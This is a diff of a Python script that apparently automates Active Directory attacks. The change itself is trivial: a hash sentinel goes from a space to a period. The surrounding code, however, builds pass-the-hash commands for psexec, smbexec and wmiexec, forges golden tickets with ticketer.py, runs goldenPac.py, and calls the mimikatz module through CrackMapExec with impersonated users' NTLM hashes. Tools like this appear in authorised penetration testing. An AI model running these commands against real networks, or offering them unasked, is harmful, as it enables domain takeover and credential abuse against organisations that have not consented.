@@ -1229,13 +1229,13 @@ while True:
       else:
           print("TGT was not generated...")
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = " " # Reset value
+      HASH = "." # Reset value
 
       for x in range (0, MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
 
-      if HASH != " ":
+      if HASH != ".":
          command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + IMP.rstrip(" ") + " -hashes :" + HASH)
          command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
          if os.path.exists(IMP.rstrip(" ") + ".ccache"):
@@ -1280,13 +1280,13 @@ while True:
           print("Golden TGT was not generated...")      
 
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = " " # Reset value
+      HASH = "." # Reset value
 
       for x in range (0, MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
 
-      if HASH != " ":
+      if HASH != ".":
          command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + IMP.rstrip(" "))
          command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
 
@@ -1319,12 +1319,12 @@ while True:
           print("Golden TGT was not generated...")
 
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = " " # Reset value
+      HASH = "." # Reset value
 
       for x in range (0, MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
-      if HASH != " ":
+      if HASH != ".":
          command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + IMP.rstrip(" "))
          command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
 
@@ -1346,13 +1346,13 @@ while True:
       print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
       command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
-      HASH = " " # Reset value
+      HASH = "." # Reset value
 
       for x in range (0, MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
 
-      if HASH != " ":
+      if HASH != ".":
          command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " -hashes :" + HASH + " "  + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" "))
       else:
          print("Hash value was not found...")
@@ -1450,13 +1450,13 @@ while True:
       command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --shares")
       command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -M mimikatz -o COMMAND='privilege::debug'")
       
-      HASH = " " # Reset Value
+      HASH = "." # Reset Value
       for x in range (0, MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
 
       print("\n[+] Now trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTLM HASH " + HASH +"...\n")
 
-      if HASH[:1] != " ":
+      if HASH[:1] != ".":
          command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + IMP.rstrip(" ") + " -H " + HASH + " -x 'net user Administrator /domain'")
       else:
          print("[-] No NTLM HAS was found for user " + IMP.rstrip(" ") + "...")
@@ -1475,12 +1475,12 @@ while True:
       command(PATH + "psexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
 
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
-      HASH = " " # Reset hash value
+      HASH = "." # Reset hash value
 
       for x in range (0,MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
 
-      if HASH[:1] != " ":
+      if HASH[:1] != ".":
          command(PATH + "psexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
       else:
          print("[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
@@ -1499,12 +1499,12 @@ while True:
       command(PATH + "smbexec.py -hashes :" + NTM.rstrip(" ") + " " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))      
       
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
-      HASH = " " # Reset hash value
+      HASH = "." # Reset hash value
 
       for x in range (0,MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
 
-      if HASH != " ":
+      if HASH != ".":
          command(PATH + "smbexec.py -hashes :" + HASH + " " + DOM.rstrip(" ") + "\\" + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))
       else:
          print("[-] No hash value was found for user " + IMP.rstrip(" ") + "...")
@@ -1523,12 +1523,12 @@ while True:
       command(PATH + "wmiexec.py -hashes :" + NTM.rstrip("\n") + " " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
       
       print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE) with their associated NTM HASH...\n")
-      HASH = " " # Reset Hash value
+      HASH = "." # Reset Hash value
 
       for x in range (0,MAX):
          if US[x].rstrip(" ") == IMP.rstrip(" "): HASH = PA[x].rstrip(" ")
 
-      if HASH != " ":  
+      if HASH != ".":  
          command(PATH + "wmiexec.py -hashes :" + HASH + " " + IMP.rstrip(" ") + "@" + TIP.rstrip(" "))   
       else:
          print("[-] No NTLM HASH was found for user " + IMP.rstrip(" ") + "...")
